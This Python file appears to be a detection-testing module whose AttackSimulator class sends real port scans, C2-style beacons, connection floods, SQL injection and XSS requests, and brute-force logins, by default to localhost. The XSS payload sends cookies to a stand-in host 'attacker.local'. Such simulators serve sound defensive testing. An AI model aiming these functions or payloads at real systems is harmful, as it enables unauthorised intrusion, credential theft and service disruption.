"""
AEGIS High-Level Real-World Cyber Threat Detection System
Live Real-World Attack Simulator & SOC Verification Engine
"""

import socket
import time
import threading
from typing import Dict, Any, List

class AttackSimulator:
    def __init__(self):
        self._active_simulations: List[str] = []

    def simulate_port_scan(self, target_ip: str = "127.0.0.1", ports_to_hit: List[int] = None) -> Dict[str, Any]:
        """
        Executes a real TCP connect scan against target to verify IDS detection.
        """
        ports = ports_to_hit or [21, 22, 23, 80, 443, 1433, 3389, 4444, 8080]
        results = []
        start_time = time.time()

        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            try:
                res = s.connect_ex((target_ip, port))
                results.append({"port": port, "status": "OPEN" if res == 0 else "CLOSED"})
            except Exception as e:
                results.append({"port": port, "status": f"ERROR: {e}"})
            finally:
                s.close()
            time.sleep(0.05)

        elapsed = round(time.time() - start_time, 2)
        return {
            "attack_type": "PORT_SCAN",
            "target": target_ip,
            "probed_ports": len(ports),
            "elapsed_seconds": elapsed,
            "details": results,
            "expected_detection": "Port Scan / Reconnaissance Probing (MITRE T1046)"
        }

    def simulate_c2_beacon(self, target_ip: str = "127.0.0.1", port: int = 8000, pulses: int = 5, interval: float = 1.0) -> Dict[str, Any]:
        """
        Sends low-jitter heartbeat pulses to simulate malware C2 check-in.
        """
        def _beacon_worker():
            for i in range(pulses):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    s.connect_ex((target_ip, port))
                    s.sendall(b"PING_C2_HEARTBEAT_AUTH=0xDEADBEEF\r\n")
                    s.close()
                except Exception:
                    pass
                time.sleep(interval)

        t = threading.Thread(target=_beacon_worker, daemon=True)
        t.start()

        return {
            "attack_type": "C2_BEACONING",
            "target": f"{target_ip}:{port}",
            "pulses": pulses,
            "interval_seconds": interval,
            "expected_detection": "Command and Control (C2) Beaconing (MITRE T1071)"
        }

    def simulate_syn_flood(self, target_ip: str = "127.0.0.1", port: int = 8000, packet_count: int = 25) -> Dict[str, Any]:
        """
        Sends rapid connection burst to trigger DDoS / SYN_SENT flood threshold.
        """
        sockets = []
        for _ in range(packet_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                try:
                    s.connect((target_ip, port))
                except BlockingIOError:
                    pass
                sockets.append(s)
            except Exception:
                pass

        time.sleep(0.5)
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

        return {
            "attack_type": "DDOS_SYN_FLOOD",
            "target": f"{target_ip}:{port}",
            "burst_packets": packet_count,
            "expected_detection": "Network Denial of Service (MITRE T1498)"
        }

    def simulate_sqli_probe(self, target_ip: str = "127.0.0.1", port: int = 8000, payload: str = None) -> Dict[str, Any]:
        """
        Sends simulated SQL injection test signature to test WAF / IDS payload inspection.
        """
        test_payload = payload or "' OR '1'='1' -- UNION SELECT username, password_hash FROM auth_operators;"
        start_time = time.time()
        success = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect_ex((target_ip, port))
            http_req = f"GET /api/status?query={test_payload} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: AEGIS-RedTeam-Attacker/1.0\r\n\r\n"
            s.sendall(http_req.encode("utf-8", errors="ignore"))
            s.close()
        except Exception:
            success = False

        elapsed = round(time.time() - start_time, 3)
        return {
            "attack_type": "SQL_INJECTION",
            "target": f"{target_ip}:{port}",
            "payload": test_payload,
            "elapsed_seconds": elapsed,
            "dispatched": success,
            "expected_detection": "Exploit Public-Facing Application / SQLi (MITRE T1190)"
        }

    def simulate_xss_probe(self, target_ip: str = "127.0.0.1", port: int = 8000, payload: str = None) -> Dict[str, Any]:
        """
        Sends simulated XSS script payload to test input filter & ML classifier.
        """
        test_payload = payload or "<script>/*AEGIS_HEALTH_PROBE*/document.location='http://attacker.local/c='+document.cookie;</script>"
        start_time = time.time()
        success = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect_ex((target_ip, port))
            http_req = f"POST /api/test-xss HTTP/1.1\r\nHost: {target_ip}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(test_payload)}\r\n\r\n{test_payload}"
            s.sendall(http_req.encode("utf-8", errors="ignore"))
            s.close()
        except Exception:
            success = False

        elapsed = round(time.time() - start_time, 3)
        return {
            "attack_type": "CROSS_SITE_SCRIPTING",
            "target": f"{target_ip}:{port}",
            "payload": test_payload,
            "elapsed_seconds": elapsed,
            "dispatched": success,
            "expected_detection": "Command and Scripting Interpreter / XSS (MITRE T1059.007)"
        }

    def simulate_brute_force(self, target_ip: str = "127.0.0.1", port: int = 8000, attempts: int = 10) -> Dict[str, Any]:
        """
        Sends rapid sequential authentication attempts to trigger rate limiting & anomaly detector.
        """
        start_time = time.time()
        test_users = ["root", "admin", "operator", "soc_analyst", "service_db", "test_user"]
        sent = 0
        for i in range(attempts):
            u = test_users[i % len(test_users)]
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect_ex((target_ip, port))
                req = f"POST /login HTTP/1.1\r\nHost: {target_ip}\r\nContent-Type: application/json\r\nContent-Length: 45\r\n\r\n{{\"username\":\"{u}\",\"password\":\"pw_{i}123\"}}"
                s.sendall(req.encode("utf-8", errors="ignore"))
                s.close()
                sent += 1
            except Exception:
                pass
            time.sleep(0.04)

        elapsed = round(time.time() - start_time, 2)
        return {
            "attack_type": "BRUTE_FORCE",
            "target": f"{target_ip}:{port}",
            "attempts_sent": sent,
            "elapsed_seconds": elapsed,
            "expected_detection": "Brute Force / Password Spraying (MITRE T1110)"
        }

    def check_system_health(self, target_ip: str = "127.0.0.1", port: int = 8000) -> Dict[str, Any]:
        """
        Executes ping & socket health check to verify website & backend availability.
        """
        start = time.time()
        is_alive = False
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        try:
            res = s.connect_ex((target_ip, port))
            is_alive = (res == 0)
        except Exception:
            is_alive = False
        finally:
            s.close()

        latency_ms = round((time.time() - start) * 1000, 2)
        return {
            "target": f"{target_ip}:{port}",
            "is_reachable": is_alive,
            "latency_ms": latency_ms,
            "health_status": "OPERATIONAL" if is_alive else "OFFLINE_OR_FILTERED",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

# Global singleton
attack_simulator = AttackSimulator()
